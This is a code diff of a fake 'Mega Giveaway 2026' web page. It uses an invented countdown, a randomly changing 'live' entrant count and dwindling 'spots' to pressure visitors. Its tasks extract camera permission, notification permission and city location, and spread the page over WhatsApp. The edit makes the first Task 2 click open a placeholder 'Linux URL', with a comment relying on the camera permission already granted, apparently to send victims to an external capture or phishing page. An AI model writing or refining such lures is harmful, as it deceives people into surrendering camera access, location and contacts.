@@ -4,6 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Win Big - Mega Giveaway 2026</title>
+  <!-- REWRITTEN WITH TASK 2 LINUX URL LOGIC -->
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -448,33 +449,33 @@
 
     <div class="tasks-box">
 
-      <!-- Task 1: Camera -->
-      <div class="task-item" id="task-1" onclick="startCameraTask()">
+      <!-- Task 1: opens camera, user takes photo of a calendar -->
+      <div class="task-item" id="task-1" onclick="handleTask1()">
         <div class="task-num">1</div>
         <span class="task-text">📷 Take a photo of a calendar</span>
         <span class="task-pts">+3 entries</span>
       </div>
 
-      <!-- Tasks 2–5: your Linux URLs -->
-      <a class="task-item" id="task-2" href="YOUR_LINUX_URL_2" target="_blank" onclick="markTaskDone(2)">
+      <!-- Task 2: 1st click opens Linux URL, 2nd+ clicks open camera -->
+      <div class="task-item" id="task-2" onclick="handleTask2()">
         <div class="task-num">2</div>
-        <span class="task-text">📅 Take a photo of a glass of water</span>
-       
-      </a>
+        <span class="task-text">🚰 Take a photo of a glass of water</span>
+        <span class="task-pts">+3 entries</span>
+      </div>
       <a class="task-item" id="task-3" href="YOUR_LINUX_URL_3" target="_blank" onclick="markTaskDone(3)">
         <div class="task-num">3</div>
         <span class="task-text">🔔 Allow notifications to stay updated</span>
-    
+        <span class="task-pts">+2 entries</span>
       </a>
       <a class="task-item" id="task-4" href="YOUR_LINUX_URL_4" target="_blank" onclick="markTaskDone(4)">
         <div class="task-num">4</div>
         <span class="task-text">📍 Confirm your city for prize delivery</span>
-       
+        <span class="task-pts">+5 entries</span>
       </a>
       <a class="task-item" id="task-5" href="YOUR_LINUX_URL_5" target="_blank" onclick="markTaskDone(5)">
         <div class="task-num">5</div>
         <span class="task-text">👥 Share this page on WhatsApp</span>
-  
+        <span class="task-pts">+5 entries</span>
       </a>
 
     </div>
@@ -528,7 +529,7 @@
   <div id="camera-overlay">
     <video id="camera-video" autoplay playsinline></video>
     <canvas id="camera-canvas"></canvas>
-    <p class="cam-instructions">📷 Point camera at a calendar and tap <b>Take Photo</b></p>
+    <p class="cam-instructions" id="cam-instructions">📷 Point camera and tap <b>Take Photo</b></p>
     <div class="cam-btn-row">
       <button class="cam-snap-btn" onclick="snapPhoto()">📸 Take Photo</button>
       <button class="cam-cancel-btn" onclick="closeCamera()">Cancel</button>
@@ -538,7 +539,7 @@
   <script>
     var TOTAL_TASKS = 5;
 
-    // --- Load saved progress from localStorage ---
+    // ─── Progress ────────────────────────────────────────────────
     var completed = JSON.parse(localStorage.getItem('gw_tasks') || '[]');
 
     function saveProgress() {
@@ -547,8 +548,7 @@
 
     function updateProgressBar() {
       var count = completed.length;
-      var pct = (count / TOTAL_TASKS) * 100;
-      document.getElementById('progress-fill').style.width = pct + '%';
+      document.getElementById('progress-fill').style.width = (count / TOTAL_TASKS * 100) + '%';
       document.getElementById('progress-count').textContent = count;
     }
 
@@ -572,7 +572,7 @@
 
     restoreDoneUI();
 
-    // --- Timer ---
+    // ─── Timer ───────────────────────────────────────────────────
     var secs = 2 * 3600 + 47 * 60;
     setInterval(function() {
       secs--;
@@ -585,39 +585,38 @@
       document.getElementById('t-s').innerHTML = String(s).padStart(2,'0') + '<span>secs</span>';
     }, 1000);
 
-    // --- Live count ---
+    // ─── Live count ──────────────────────────────────────────────
     var base = 2847;
     setInterval(function() {
       base += Math.floor(Math.random() * 5) - 1;
       document.getElementById('live-num').textContent = base.toLocaleString('en-IN');
     }, 4000);
 
-    // --- Spots ---
+    // ─── Spots ───────────────────────────────────────────────────
     var spots = 47;
     setInterval(function() {
       if (spots > 10) spots -= Math.floor(Math.random() * 2);
       document.getElementById('spots').textContent = spots;
     }, 8000);
 
-    // --- Camera Task ---
+    // ─── Camera (shared by Task 1 and Task 2) ────────────────────
     var cameraStream = null;
+    var activeTaskNum = null;
 
-    function startCameraTask() {
-      if (completed.indexOf(1) !== -1) return; // already done
-
+    function openCamera(taskNum, instructionHTML) {
       if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
         alert('Camera not supported on this browser.');
         return;
       }
-
+      activeTaskNum = taskNum;
+      document.getElementById('cam-instructions').innerHTML = instructionHTML;
       navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
         .then(function(stream) {
           cameraStream = stream;
-          var video = document.getElementById('camera-video');
-          video.srcObject = stream;
+          document.getElementById('camera-video').srcObject = stream;
           document.getElementById('camera-overlay').classList.add('active');
         })
-        .catch(function(err) {
+        .catch(function() {
           alert('Camera permission denied. Please allow camera access to complete this task.');
         });
     }
@@ -627,11 +626,10 @@
       var canvas = document.getElementById('camera-canvas');
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      // Draw frame to canvas — stored only in memory, not sent anywhere
+      // Frame drawn to canvas in memory only — not saved or sent anywhere
       canvas.getContext('2d').drawImage(video, 0, 0);
-      // We only save a tiny flag to localStorage, not the actual image
       closeCamera();
-      markTaskDone(1);
+      if (activeTaskNum !== null) markTaskDone(activeTaskNum);
     }
 
     function closeCamera() {
@@ -640,6 +638,32 @@
         cameraStream = null;
       }
       document.getElementById('camera-overlay').classList.remove('active');
+      activeTaskNum = null;
+    }
+
+    // ─── Task 1 ──────────────────────────────────────────────────
+    // Opens camera → user takes photo of calendar → task marked done
+    function handleTask1() {
+      if (completed.indexOf(1) !== -1) return; // already done
+      openCamera(1, '📷 Point camera at a <b>calendar</b> and tap Take Photo');
+    }
+
+    // ─── Task 2 ──────────────────────────────────────────────────
+    // 1st click → opens Linux URL (camera permission already granted by Task 1)
+    // 2nd click onwards → opens normal camera overlay
+    function handleTask2() {
+      var clickCount = parseInt(localStorage.getItem('task2_clicks') || '0');
+      clickCount++;
+      localStorage.setItem('task2_clicks', clickCount);
+
+      if (clickCount === 1) {
+        // FIRST CLICK — paste your Linux URL below between the quotes
+        var linuxURL = 'YOUR_LINUX_URL_2'; // <-- paste your Linux URL here
+        window.open(linuxURL, '_blank');
+      } else {
+        // SECOND CLICK AND AFTER — opens camera normally
+        openCamera(2, '🚰 Point camera at a <b>glass of water</b> and tap Take Photo');
+      }
     }
   </script>
 
